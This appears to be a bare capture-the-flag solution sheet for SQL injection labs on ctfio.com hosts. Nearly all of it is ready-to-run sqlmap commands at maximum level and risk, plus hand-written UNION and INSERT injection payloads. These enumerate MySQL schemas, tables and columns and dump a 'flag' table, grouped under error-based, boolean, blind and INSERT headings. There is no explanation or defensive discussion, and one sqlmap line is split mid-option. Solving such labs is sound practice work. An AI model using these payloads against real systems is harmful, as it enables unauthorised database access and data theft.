____
# ERROR 

```bash
sqlmap -u "https://3q6m7sai.eu1.ctfio.com/article?id=1" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dump -T flag -D sqli_two
```

```bash
https://3q6m7sai.eu1.ctfio.com/article?id=' UNION SELECT 1,2,3,GROUP_CONCAT(schema_name) FROM information_schema.schemata-- -
```

```bash
https://3q6m7sai.eu1.ctfio.com/article?id=' UNION SELECT 1,2,3,GROUP_CONCAT(table_name) FROM information_schema.tables where table_schema = 'sqli_two'-- -
```

```bash
https://3q6m7sai.eu1.ctfio.com/article?id=' UNION SELECT 1,2,3,GROUP_CONCAT(column_name) from information_schema.columns where table_name = 'flag'-- -
```

```bash
https://3q6m7sai.eu1.ctfio.com/article?id=' UNION SELECT 1,2,3,flag from flag-- -
```

# BOOLEAN

```bash
sqlmap -u "https://b2ybgm86.eu1.ctfio.com/api/checkuser?username=adam" --level 5 --risk 3 -p username --batch --threads 10 --dbms=mysql --dump -T flag -D sqli_three
```

# BLIND

```bash
sqlmap -u "https://64cul97j.eu1.ctfio.com/?email=test" --level 5 --risk 3 -p email --batch --threads 10 --dbms=mysql --dump -T flag -D sqli_four
```

# ERROR based INSERT

```bash
title', (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_NAME='flag' AND TABLE_SCHEMA='sqli_five'));-- '
```

```bash
title', (SELECT GROUP_CONCAT(flag) FROM sqli_five.flag));-- '
```

# BLIND based INSERT

```bash
sqlmap -u "https://89wtmldm.eu1.ctfio.com/" --data='name=test&email=test&message=test' --m  
ethod POST --level 5 --risk 3 --batch --threads 10 --dbms=mysql --dump -T flag -D sqli_six
```

